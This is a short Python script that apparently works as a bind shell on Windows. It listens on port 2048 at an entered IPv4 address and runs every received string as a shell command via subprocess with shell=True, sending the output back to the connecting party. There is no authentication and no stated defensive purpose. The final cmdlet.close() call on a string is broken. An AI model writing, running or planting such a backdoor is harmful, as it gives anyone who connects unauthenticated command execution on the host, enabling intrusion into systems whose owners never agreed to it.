import socket
import subprocess
import os
from termcolor import colored
os.system('CLS')
nat = input(colored('[#] Enter Your IPv4 Address: ', 'blue'))
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((nat,2048))
s.listen(2)
client, addr = s.accept()
cmdlet = client.recv(2048).decode()
while cmdlet!='quit':
    print(cmdlet)
    cmdlet=str(cmdlet)
    result = subprocess.check_output(cmdlet,shell=True)
    print(result)
    client.send(result)
    cmdlet = client.recv(2048).decode()
    if cmdlet == 'cls':
        os.system('CLS')
cmdlet.close()
s.close()